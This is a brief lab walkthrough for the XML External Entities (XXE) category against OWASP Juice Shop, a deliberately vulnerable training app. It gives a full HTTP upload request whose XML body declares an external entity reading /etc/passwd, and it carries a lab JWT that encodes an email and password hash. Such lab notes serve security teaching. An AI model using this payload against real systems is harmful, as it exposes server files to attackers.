# A4 - XML External Entities (XXE)

## OWASP Juice Shop

From the left menu choose `Complaint` and try to upload a file.

```
POST /file-upload HTTP/1.1
Host: juice-shop.lab
Content-Length: 303
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTcsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJwZW50ZXN0QGNpdGFkZWxvLmNvbSIsInBhc3N3b3JkIjoiNmEyODQxNTU5MDZjMjZjYmNhMjBjNTMzNzZiYzYzYWMiLCJyb2xlIjoiY3VzdG9tZXIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiJkZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMC0xMS0wMiAxMzo0Mjo0OC41MzUgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMC0xMS0wMiAxMzo0Mjo0OC41MzUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjA0MzI0NTgwLCJleHAiOjE2MDQzNDI1ODB9.Je66KESQrX5RP729cztb3YKDa6NeLSPcXRO9VtIun6Zs5GFgLvG7uU0QLyBY-JFimH0cEQF06uyz7r7uHCL3FOXc3pGf4pv7YqHs3kp6DsigLAhdZFLwwmX4MxdCdQTmZdnQsUoeVGMTSS4p1uy-i37bofvs97IvWHRhNQmPeqs
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4202.0 Safari/537.36 autochrome/red
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLfg18k3QqHU6u3hR
Accept: */*
Origin: http://juice-shop.lab
Referer: http://juice-shop.lab/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTcsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJwZW50ZXN0QGNpdGFkZWxvLmNvbSIsInBhc3N3b3JkIjoiNmEyODQxNTU5MDZjMjZjYmNhMjBjNTMzNzZiYzYzYWMiLCJyb2xlIjoiY3VzdG9tZXIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiJkZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMC0xMS0wMiAxMzo0Mjo0OC41MzUgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMC0xMS0wMiAxMzo0Mjo0OC41MzUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjA0MzI0NTgwLCJleHAiOjE2MDQzNDI1ODB9.Je66KESQrX5RP729cztb3YKDa6NeLSPcXRO9VtIun6Zs5GFgLvG7uU0QLyBY-JFimH0cEQF06uyz7r7uHCL3FOXc3pGf4pv7YqHs3kp6DsigLAhdZFLwwmX4MxdCdQTmZdnQsUoeVGMTSS4p1uy-i37bofvs97IvWHRhNQmPeqs; io=eTV6JF3E1pFDGvBEAAAC
Connection: close

------WebKitFormBoundaryLfg18k3QqHU6u3hR
Content-Disposition: form-data; name="file"; filename="test.xml"
Content-Type: application/pdf

<?xml version="1.0"?>
<!DOCTYPE x [
<!ELEMENT x ANY >
<!ENTITY x SYSTEM "file:///etc/passwd" >]><xxe>&x;</xxe>


------WebKitFormBoundaryLfg18k3QqHU6u3hR--

```

note: *There are issues with DTD in the Juice Shop*
